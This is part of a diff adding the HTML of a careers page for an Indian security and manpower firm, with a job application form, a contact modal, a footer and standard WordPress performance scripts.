+                                          <option value="Morocco">Morocco</option>
+                                          <option value="Monaco">Monaco</option>
+                                          <option value="Moldova, Republic of">Moldova, Republic of</option>
+                                          <option value="Madagascar">Madagascar</option>
+                                          <option value="Maldives">Maldives</option>
+                                          <option value="Mexico">Mexico</option>
+                                          <option value="Marshall Islands">Marshall Islands</option>
+                                          <option value="Macedonia, the former Yugoslav Republic of">Macedonia, the former Yugoslav Republic of</option>
+                                          <option value="Mali">Mali</option>
+                                          <option value="Malta">Malta</option>
+                                          <option value="Myanmar">Myanmar</option>
+                                          <option value="Montenegro">Montenegro</option>
+                                          <option value="Mongolia">Mongolia</option>
+                                          <option value="Northern Mariana Islands">Northern Mariana Islands</option>
+                                          <option value="Mozambique">Mozambique</option>
+                                          <option value="Mauritania">Mauritania</option>
+                                          <option value="Montserrat">Montserrat</option>
+                                          <option value="Martinique">Martinique</option>
+                                          <option value="Mauritius">Mauritius</option>
+                                          <option value="Malawi">Malawi</option>
+                                          <option value="Malaysia">Malaysia</option>
+                                          <option value="Mayotte">Mayotte</option>
+                                          <option value="Namibia">Namibia</option>
+                                          <option value="New Caledonia">New Caledonia</option>
+                                          <option value="Niger">Niger</option>
+                                          <option value="Norfolk Island">Norfolk Island</option>
+                                          <option value="Nigeria">Nigeria</option>
+                                          <option value="Nicaragua">Nicaragua</option>
+                                          <option value="Niue">Niue</option>
+                                          <option value="Netherlands">Netherlands</option>
+                                          <option value="Norway">Norway</option>
+                                          <option value="Nepal">Nepal</option>
+                                          <option value="Nauru">Nauru</option>
+                                          <option value="New Zealand">New Zealand</option>
+                                          <option value="Oman">Oman</option>
+                                          <option value="Pakistan">Pakistan</option>
+                                          <option value="Panama">Panama</option>
+                                          <option value="Pitcairn">Pitcairn</option>
+                                          <option value="Peru">Peru</option>
+                                          <option value="Philippines">Philippines</option>
+                                          <option value="Palau">Palau</option>
+                                          <option value="Papua New Guinea">Papua New Guinea</option>
+                                          <option value="Poland">Poland</option>
+                                          <option value="Puerto Rico">Puerto Rico</option>
+                                          <option value="Korea, Democratic People&#039;s Republic of">Korea, Democratic People&#039;s Republic of</option>
+                                          <option value="Portugal">Portugal</option>
+                                          <option value="Paraguay">Paraguay</option>
+                                          <option value="Palestine, State of">Palestine, State of</option>
+                                          <option value="French Polynesia">French Polynesia</option>
+                                          <option value="Qatar">Qatar</option>
+                                          <option value="Réunion">Réunion</option>
+                                          <option value="Romania">Romania</option>
+                                          <option value="Russian Federation">Russian Federation</option>
+                                          <option value="Rwanda">Rwanda</option>
+                                          <option value="Saudi Arabia">Saudi Arabia</option>
+                                          <option value="Sudan">Sudan</option>
+                                          <option value="Senegal">Senegal</option>
+                                          <option value="Singapore">Singapore</option>
+                                          <option value="South Georgia and the South Sandwich Islands">South Georgia and the South Sandwich Islands</option>
+                                          <option value="Saint Helena, Ascension and Tristan da Cunha">Saint Helena, Ascension and Tristan da Cunha</option>
+                                          <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
+                                          <option value="Solomon Islands">Solomon Islands</option>
+                                          <option value="Sierra Leone">Sierra Leone</option>
+                                          <option value="El Salvador">El Salvador</option>
+                                          <option value="San Marino">San Marino</option>
+                                          <option value="Somalia">Somalia</option>
+                                          <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
+                                          <option value="Serbia">Serbia</option>
+                                          <option value="South Sudan">South Sudan</option>
+                                          <option value="Sao Tome and Principe">Sao Tome and Principe</option>
+                                          <option value="Suriname">Suriname</option>
+                                          <option value="Slovakia">Slovakia</option>
+                                          <option value="Slovenia">Slovenia</option>
+                                          <option value="Sweden">Sweden</option>
+                                          <option value="Swaziland">Swaziland</option>
+                                          <option value="Sint Maarten (Dutch part)">Sint Maarten (Dutch part)</option>
+                                          <option value="Seychelles">Seychelles</option>
+                                          <option value="Syrian Arab Republic">Syrian Arab Republic</option>
+                                          <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
+                                          <option value="Chad">Chad</option>
+                                          <option value="Togo">Togo</option>
+                                          <option value="Thailand">Thailand</option>
+                                          <option value="Tajikistan">Tajikistan</option>
+                                          <option value="Tokelau">Tokelau</option>
+                                          <option value="Turkmenistan">Turkmenistan</option>
+                                          <option value="Timor-Leste">Timor-Leste</option>
+                                          <option value="Tonga">Tonga</option>
+                                          <option value="Trinidad and Tobago">Trinidad and Tobago</option>
+                                          <option value="Tunisia">Tunisia</option>
+                                          <option value="Turkey">Turkey</option>
+                                          <option value="Tuvalu">Tuvalu</option>
+                                          <option value="Taiwan, Province of China">Taiwan, Province of China</option>
+                                          <option value="Tanzania, United Republic of">Tanzania, United Republic of</option>
+                                          <option value="Uganda">Uganda</option>
+                                          <option value="Ukraine">Ukraine</option>
+                                          <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
+                                          <option value="Uruguay">Uruguay</option>
+                                          <option value="United States">United States</option>
+                                          <option value="Uzbekistan">Uzbekistan</option>
+                                          <option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option>
+                                          <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
+                                          <option value="Venezuela, Bolivarian Republic of">Venezuela, Bolivarian Republic of</option>
+                                          <option value="Virgin Islands, British">Virgin Islands, British</option>
+                                          <option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
+                                          <option value="Viet Nam">Viet Nam</option>
+                                          <option value="Vanuatu">Vanuatu</option>
+                                          <option value="Wallis and Futuna">Wallis and Futuna</option>
+                                          <option value="Samoa">Samoa</option>
+                                          <option value="Yemen">Yemen</option>
+                                          <option value="South Africa">South Africa</option>
+                                          <option value="Zambia">Zambia</option>
+                                          <option value="Zimbabwe">Zimbabwe</option>
+                                        </select>
+                                      </div>
+                                    </div>
+                                    <div class="col-md-6 mb-4">
+                                      <div class="group">
+                                        <input type="number" name="phone" required /> 
+                                        <span class="highlight"></span> <span class="bar"></span> <label>Phone Number*</label>
+                                      </div>
+                                    </div>
+                                    <div class="col-md-6 mb-5">
+                                      <div class="group"><input type="text" name="passport" required />
+                                        <span class="highlight"></span> <span class="bar"></span> <label>Passport Number*</label>
+                                      </div>
+                                    </div>
+                                    <div class="col-md-6 mb-5">
+                                      <div class="select-dropdown"> 
+                                        <select name="job_type" required>
+                                          <option value="">Job You’re Interested In*</option>
+                                          <option value="Chauffeur Driver">Chauffeur Driver</option>
+                                          <option value="Cleaning Supervisor">Cleaning Supervisor</option>
+                                          <option value="Forklift Operator">Forklift Operator</option>
+                                          <option value="Security Guard - Female">Security Guard - Female</option>
+                                          <option value="Driver Class 3">Driver Class 3</option>
+                                          <option value="Driver Class 4">Driver Class 4</option>
+                                          <option value="Store Keeper">Store Keeper</option>
+                                          <option value="Multi Technician">Multi Technician</option>
+                                          <option value="Tractor Driver">Tractor Driver</option>
+                                          <option value="Team Leader">Team Leader</option>
+                                          <option value="Butler-Female">Butler-Female</option>
+                                          <option value="Security Guard - Male">Security Guard - Male</option>
+                                          <option value="CCTV - Operator">CCTV - Operator</option>
+                                        </select>
+                                      </div>
+                                    </div>
+                                    <div class="col-md-12 mb-4">
+                                      <div class="group tg-upload-cv-container">
+                                        <input type="file" name="upload_cv" />
+                                        <span class="highlight"></span> <span class="bar"></span> <label class="upload_cv_label">Upload Resume*</label>
+                                      </div>
+                                    </div>
+                                    <div class="col-md-12 text-left">
+                                      <div class="group">
+                                        <input type="submit" value="Submit" class="btn btn-dark rounded-0 p-2 pl-4 pr-4" /><br><br><span>*Please apply for only one (1) job. We will consider you for other roles once we review your CV.</span><span class="glyphicon glyphicon-send"></span></div>
+                                      </div>
+                                    </div>
+                                  </form>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-1ae3018 career_column2" data-id="1ae3018" data-element_type="column">
+                      <div class="elementor-column-wrap elementor-element-populated">
+                        <div class="elementor-widget-wrap">
+                          <div class="elementor-element elementor-element-4877c5c elementor-widget elementor-widget-video" data-id="4877c5c" data-element_type="widget" data-settings="{&quot;youtube_url&quot;:&quot;https:\/\/www.youtube.com\/watch?v=IuTCtsBob0U&quot;,&quot;video_type&quot;:&quot;youtube&quot;,&quot;controls&quot;:&quot;yes&quot;}" data-widget_type="video.default">
+                            <div class="elementor-widget-container">
+                              <div class="elementor-wrapper elementor-open-inline">
+                                <div class="elementor-video"></div>
+                              </div>
+                            </div>
+                          </div>
+
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </div>
+          </div>
+        </div>
+      </main>
+      <style>
+  /*float buttons*/
+.whatsapp-button{
+    position: fixed;
+    bottom: 15px;
+    right: 15px;
+    z-index: 99;
+    background-color: #25d366;
+    border-radius: 50px;
+    color: #ffffff;
+    text-decoration: none;
+    width: 50px;
+    height: 50px;
+    font-size: 30px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    -webkit-box-shadow: 0px 0px 25px -6px rgba(0,0,0,1);
+    -moz-box-shadow: 0px 0px 25px -6px rgba(0,0,0,1);
+    box-shadow: 0px 0px 25px -6px rgba(0,0,0,1);
+    animation: effect 5s infinite ease-in;
+}
+.call-button{
+    position: fixed;
+    bottom: 15px;
+    left: 15px;
+    z-index: 99;
+    background-color: #3fd0d4;
+    border-radius: 50px;
+    color: #ffffff;
+    text-decoration: none;
+    width: 50px;
+    height: 50px;
+    font-size: 30px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    -webkit-box-shadow: 0px 0px 25px -6px rgba(0,0,0,1);
+    -moz-box-shadow: 0px 0px 25px -6px rgba(0,0,0,1);
+    box-shadow: 0px 0px 25px -6px rgba(0,0,0,1);
+    animation: effect 5s infinite ease-in;
+}
+.call-button i{
+    font-size: 24px;
+}
+
+.whatsapp-button:hover,.call-button:hover{
+    background-color: #3DB3B7;
+}
+.whatsapp-button:hover i{
+    color: #fff;
+}
+.call-button:hover i{
+    color: #fff;
+}
+
+@keyframes effect {
+    20%, 100% {
+        width: 50px;
+        height: 50px;
+        font-size: 30px;
+    }
+    0%, 10%{
+        width: 55px;
+        height: 55px;
+        font-size: 35px;
+    }
+    5%{
+        width: 50px;
+        height: 50px;
+        font-size: 30px;
+    }
+}
+</style>
+<a target="_blank" href="https://api.whatsapp.com/send?phone=917505535925" class="whatsapp-button"><i class="fa-brands fa-whatsapp"></i></a>
+<a href="tel:7505535925" class="call-button"><i class="fa-solid fa-phone"></i></a>
+
+ <footer class="bg-gray-tg pt-5 pb-5">
+    <div class="container-fluid pb-3">
+      <div class="row d-flex align-items-top">
+        <!-- justify-content-center-->
+        <div class="col-sm-3">
+          <div class="tg_widget_start">
+            <h3 class="font-emi" style="font-size: 24px; letter-spacing: -0.02em;">Transguard Security & Manpower Services Pvt Ltd</h3>
+            <div class="menu-footer-menu-1-container">
+              <ul id="menu-footer-menu-1" class="navigation_links f-child">
+                <li id="menu-item-1567" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1567 nav-item "><a href="about-us" class="nav-link ">About Us</a></li>
+                <!--<li id="menu-item-1168" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1168 nav-item "><a href="news" class="nav-link ">News</a></li>-->
+                <!--<li id="menu-item-1165" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1165 nav-item "><a href="csr" class="nav-link ">CSR</a></li>-->
+                <li id="menu-item-1167" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1167 nav-item "><a href="careers" class="nav-link ">Careers</a></li>
+                <li id="menu-item-1166" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1166 nav-item "><a href="contact-us" class="nav-link ">Contact Us</a></li>
+                <li id="menu-item-5234" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-5234 nav-item "><a href="privacy-policy" class="nav-link ">Privacy Policy</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="col-sm-3">
+          <div class="tg_widget_start">
+            <h3 class="font-emi">Our Services</h3>
+            <div class="menu-footer-menu-2-container">
+              <ul id="menu-footer-menu-2" class="navigation_links f-child">
+                <!--<li id="menu-item-34" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-34 nav-item "><a href="cash-services" class="nav-link ">Cash Services</a></li>-->
+                <li id="menu-item-35" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-35 nav-item "><a href="security-solutions" class="nav-link ">Security Services</a></li>
+                <li id="menu-item-1563" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1563 nav-item "><a href="manpower-solutions" class="nav-link ">Manpower Solutions</a></li>
+                <!--<li id="menu-item-36" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-36 nav-item "><a href="hr-outsourcing" class="nav-link ">Workforce Solutions</a></li>-->
+                <li id="menu-item-37" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-37 nav-item "><a href="integrated-facility-services" class="nav-link ">Facilities Management</a></li>
+                <!--<li id="menu-item-1566" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1566 nav-item "><a href="aviation-services" class="nav-link ">Aviation Services</a></li>-->
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="col-sm-3">
+          <div class="tg_widget_start">
+            <h3 class="font-emi">Regional Office</h3>
+            <div class="menu-footer-menu-4-container">
+              <ul id="menu-footer-menu-4" class="navigation_links f-child">
+                <li id="menu-item-1865" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1865 nav-item "><a target="_blank" rel="noopener" href="https://goo.gl/maps/Hx2GaKsDKuccb5it7" class="nav-link "> Transguard Security Regional Office, Dehradun, Uttarakhand </a></li>
+                <li id="menu-item-1866" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1866 nav-item "><a target="_blank" rel="noopener" href="https://goo.gl/maps/C5ieKJwgLUm6XFWi7" class="nav-link "> Transguard Security Regional Office,  Karnal Haryana</a></li>
+                <li id="menu-item-43" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-43 nav-item "><a target="_blank" rel="noopener" href="javascript:void[0]" class="nav-link "> Transguard Security Regional Office, Jaipur Rajashthan</a></li>
+                <li id="menu-item-1617" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1617 nav-item "><a target="_blank" rel="noopener" href="https://goo.gl/maps/BagJNxaE9JbcR4Qr7" class="nav-link "> Transguard Security Regional Office, Chandigarh Punjab</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="col-sm-3">
+          <div class="tg_widget_start">
+            <h3 class="font-emi">Corporate Office</h3>
+            <div class="menu-footer-menu-4-container">
+              <ul id="menu-footer-menu-4" class="navigation_links f-child">
+                <li id="menu-item-42" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-42 nav-item "><a target="_blank" rel="noopener" href="https://www.google.com/search?q=Transguard+Security+%26+Manpower+Services+lucknow&rlz=1C1CHBF_enIN780IN780&sxsrf=AJOqlzWXq92chAeHYFiRbV9Yk3Eq8DuEmA%3A1679046613983&ei=1TcUZN-vO_CL4-EPobSKuAM&ved=0ahUKEwif7vKH2OL9AhXwxTgGHSGaAjcQ4dUDCA8&uact=5&oq=Transguard+Security+%26+Manpower+Services+lucknow&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIECCMQJzoHCCMQsAMQJzoKCAAQRxDWBBCwA0oECEEYAFDAAViZEmDvFGgBcAF4AIABjQKIAc4LkgEFMC42LjKYAQCgAQHIAQnAAQE&sclient=gws-wiz-serp" class="nav-link ">Transguard Security Registered Office, Lucknow, UP </a></li>
+                <li id="menu-item-1864" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1864 nav-item "><a target="_blank" rel="noopener" href="https://goo.gl/maps/TXvNBvzP7uqL1qAW9" class="nav-link ">Transguard Security Corporate Office, Delhi</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </footer>
+
+  <!--copyright starts-->
+  <div class="bottom_bar">
+    <div class="container">
+      <div class="row align-items-center">
+        <div class="col-md-6 text-center text-sm-left pt-2 pt-sm-0 pb-2 pb-sm-0">
+          <p class="mb-0" id="tg-copyright">
+            © 2023 Transgurad Security & Manpower Services All Right Reserved.</p>
+        </div>
+        <div class="col-md-6 text-center text-sm-right">
+          <ul class="social">
+            <li>
+              <a target='_blank' title='Facebook' href='https://www.facebook.com/profile.php?id=61556004612526'>
+                <img src='wp-content/uploads/2021/01/facebook.svg' alt='Facebook'></a>
+            </li>
+            <li>
+              <a target='_blank' title='Twitter' href='https://twitter.com/Transguardindia'>
+                <img src='wp-content/uploads/2021/01/twitter.svg' alt='Twitter'></a>
+            </li>
+            <li>
+              <a target='_blank' title='Instagram' href='https://www.instagram.com/transguardindia/'>
+                <img src='wp-content/uploads/2021/01/instagram.svg' alt='Instagram'></a>
+            </li>
+           <!-- <li>
+              <a target='_blank' title='Linkedin' href='https://www.linkedin.com/company/'>
+                <img src='wp-content/uploads/2021/01/linkedin-white.svg' alt='Linkedin'></a>
+            </li>-->
+            <li>
+              <a target='_blank' title='Youtube' href='https://www.youtube.com/channel/'>
+                <img src='wp-content/uploads/2021/01/youtube.svg' alt='Youtube'></a>
+            </li>
+
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--copyrights ends-->
+
+
+<!--enquiry now model-->
+                          <!-- Modal -->
+                          <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog" role="document">
+                              <div class="modal-content tg-banner-modal-content">
+                                <button type="button" class="close new tg-banner-popup-close" data-dismiss="modal" aria-label="Close">
+                                  <span aria-hidden="true">&times;</span>
+                                </button>
+                                <div class="modal-body pt-5 pb-5 tg-banner-modal-body">
+                                  <div class="row justify-content-center">
+                                    <div class=" col-md-11">
+                                      <div class="row mb-4">
+                                        <div class="col-lg-12 col-md-12">
+                                          <h2 class="font-emi tg-banner-enquiry-title">Get in <span class="primary-color">touch</span></h2>
+                                        </div>
+                                      </div>
+                                      <div id="th-banner-shortcode-container">
+                                        <div role="form" class="wpcf7" id="wpcf7-f768-p412-o1" lang="en-US" dir="ltr">
+                                          <div class="screen-reader-response">
+                                            <p role="status" aria-live="polite" aria-atomic="true"></p>
+                                            <ul></ul>
+                                          </div>
+                                          <form action="contact-mail" method="post" class="wpcf7-form init" >
+                                           
+                                            <div class="row">
+                                              <div class=" col-md-6 mb-4">
+                                                <div class="group"> <span class="wpcf7-form-control-wrap" data-name="applicant_name"><input type="text" name="applicant_name" placeholder="Name"size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" /></span> <span class="highlight"></span> <span class="bar"></span> </div>
+                                              </div>
+                                              <div class=" col-md-6 mb-4">
+                                                <div class="group"> <span class="wpcf7-form-control-wrap" data-name="email"><input type="email" name="email" placeholder="Email" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" aria-required="true" aria-invalid="false" /></span> <span class="highlight"></span> <span class="bar"></span></div>
+                                              </div>
+                                              <div class=" col-md-6 mb-4">
+                                                <div class="group"> <span class="wpcf7-form-control-wrap" data-name="phone"><input type="tel" name="phone" placeholder="Phone" size="40" class="wpcf7-form-control wpcf7-text wpcf7-tel wpcf7-validates-as-required wpcf7-validates-as-tel" aria-required="true" aria-invalid="false" /></span> <span class="highlight"></span> <span class="bar"></span> </div>
+                                              </div>
+                                              <div class=" col-md-6 mb-4">
+                                                <div class="group"> <span class="wpcf7-form-control-wrap" data-name="company"><input type="text" name="company" placeholder="Company" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" /></span> <span class="highlight"></span> <span class="bar"></span> </div>
+                                              </div>
+                                              <div class=" col-md-12 mb-4">
+                                                <div class="select-dropdown"> <span class="wpcf7-form-control-wrap" data-name="service-type"><select name="service-type" class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required" aria-required="true" aria-invalid="false">
+                                                      <option>What service are you looking for?</option>
+                                                      <option value="Administrative Support">Administrative Support</option>
+                                                      <option value="Aviation Manpower Solutions">Aviation Manpower Solutions</option>
+                                                      <option value="Customer Service">Customer Service</option>
+                                                      <option value="Equipment Operators">Equipment Operators</option>
+                                                      <option value="Transguard Logistics">Transguard Logistics</option>
+                                                    </select></span> </div>
+                                              </div>
+                                              <div class=" col-md-12 mb-5">
+                                                <div class="group"> <span class="wpcf7-form-control-wrap" data-name="message"><input type="text" name="message" placeholder="Message" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" /></span> <span class="highlight"></span> <span class="bar"></span> </div>
+                                              </div>
+                                              <div class=" col-md-6 text-left">
+                                                <div class="group"> <input type="submit" value="Submit" class="wpcf7-form-control has-spinner wpcf7-submit btn btn-dark rounded-0 p-2 pl-4 pr-4" /> </div>
+                                              </div>
+                                              <div class="col-md-6 text-right">
+                                                <div class="group"><a href="careers" class="btn btn-dark rounded-0 p-2 pl-4 pr-4 work_for_us">Work For Us</a></div>
+                                              </div>
+                                            </div>
+                                            <div class="wpcf7-response-output" aria-hidden="true"></div>
+                                          </form>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <!--enquiry now model ends-->
+  
+  
+  
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/transguard-elementor/dist/js/jquery.bxslider.min95da.js?ver=124881776' id='transguard-elementor-bxslider-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/transguard-elementor/dist/js/jquery.slimscroll.min892f.js?ver=1723687304' id='transguard-elementor-slimscroll-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/transguard-elementor/dist/js/public.mine763.js?ver=721260013' id='transguard-elementor-script-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' id='rocket-browser-checker-js-after'>
+    "use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();
+</script>
+  <script type='text/javascript' id='rocket-preload-links-js-extra'>
+    /* <![CDATA[ */
+    var RocketPreloadLinksConfig = {
+      "excludeUris": "\/(?:.+\/)?feed(?:\/(?:.+\/?)?)?$|\/(?:.+\/)?embed\/|\/(index\\.php\/)?wp\\-json(\/.*|$)|\/refer\/|\/go\/|\/recommend\/|\/recommends\/",
+      "usesTrailingSlash": "1",
+      "imageExt": "jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php",
+      "fileExt": "jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php|html|htm",
+      "siteUrl": "https:\/\/transguardgroup.com",
+      "onHoverDelay": "100",
+      "rateThrottle": "3"
+    };
+    /* ]]> */
+  </script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' id='rocket-preload-links-js-after'>
+    (function() {
+"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("index.php")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("index.php")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof RocketPreloadLinksConfig&&new n(new RocketBrowserCompatibilityChecker({capture:!0,passive:!0}),RocketPreloadLinksConfig).init()}}]),n}();t.run();
+}());
+</script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/themes/transguard/dist/assets/jstg/bootstrap.min8a54.js?ver=1.0.0' id='transguard_bootstrap_script-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='cdn.jsdelivr.net/gh/fancyapps/fancybox%403.5.7/dist/jquery.fancybox.min8a54.js?ver=1.0.0' id='transguard_fancybox_script-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/themes/transguard/dist/assets/js/main8a54.js?ver=1.0.0' id='transguard_main_script-js' defer></script>
+  
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/cf7-conditional-fields/js/scriptsdbc2.js?ver=2.2.6' id='wpcf7cf-scripts-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='../www.google.com/recaptcha/apiec25.js?render=6LfauycaAAAAAJ38J_eQm_C9g0bQ2gs7muQlhxit&amp;ver=3.0' id='google-recaptcha-js'></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-includes/js/dist/vendor/regenerator-runtime.min3937.js?ver=0.13.9' id='regenerator-runtime-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-includes/js/dist/vendor/wp-polyfill.min2c7c.js?ver=3.15.0' id='wp-polyfill-js'></script>
+  <script type='text/javascript' id='wpcf7-recaptcha-js-extra'>
+    /* <![CDATA[ */
+    var wpcf7_recaptcha = {
+      "sitekey": "6LfauycaAAAAAJ38J_eQm_C9g0bQ2gs7muQlhxit",
+      "actions": {
+        "homepage": "homepage",
+        "contactform": "contactform"
+      }
+    };
+    /* ]]> */
+  </script>
